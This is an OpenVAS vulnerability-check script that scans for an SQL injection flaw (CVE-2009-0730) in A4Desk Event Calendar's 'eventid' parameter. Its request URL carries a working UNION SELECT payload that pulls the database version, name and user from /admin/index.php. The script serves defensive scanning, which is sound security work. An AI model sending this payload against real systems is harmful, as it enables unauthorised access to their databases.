###############################################################################
# OpenVAS Vulnerability Test
# $Id: A4Desk_event_calendar_sql_injection.nasl 15 2013-10-27 12:49:54Z jan $
#
# A4Desk Event Calendar 'eventid' Parameter SQL Injection
# Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "A4Desk Event Calendar is prone to an SQL-injection vulnerability
  because it fails to sufficiently sanitize user-supplied data before
  using it in an SQL query.

  Exploiting this issue could allow an attacker to compromise the
  application, access or modify data, or exploit latent
  vulnerabilities in the underlying database. 

  Seee http://www.securityfocus.com/bid/33835/ and
  http://php.a4desk.com/calendar/ for further informations.";


if (description)
{
 script_id(100006);
 script_version("$Revision: 15 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2009-03-02 16:07:07 +0100 (Mon, 02 Mar 2009)");
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2009-0730");
 script_bugtraq_id(33863);
  script_tag(name:"risk_factor", value:"High");

 script_name("A4Desk Event Calendar 'eventid' Parameter SQL Injection Vulnerability");
 desc = "

 Summary:
 " + tag_summary;

 script_description(desc);
 script_summary("Determine if A4Desk Event Calendar is vulnerable to SQL Injection");
 script_category(ACT_GATHER_INFO);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dir = make_list("/calendar", cgi_dirs()); 
 
foreach d (dir)
{ 
 url = string(d, "/admin/index.php?eventid=-1+union+all+select+1,concat_ws(version(),0x3a,database(),0x3a,user()),3,4,5,6--");
 req = http_get(item:url, port:port);
 buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
 if( buf == NULL )exit(0);

 if( egrep(pattern: ".*form action=.*union all select.*", string: buf) )
   {    
    security_hole(port:port);
    exit(0);
   }
}
exit(0);
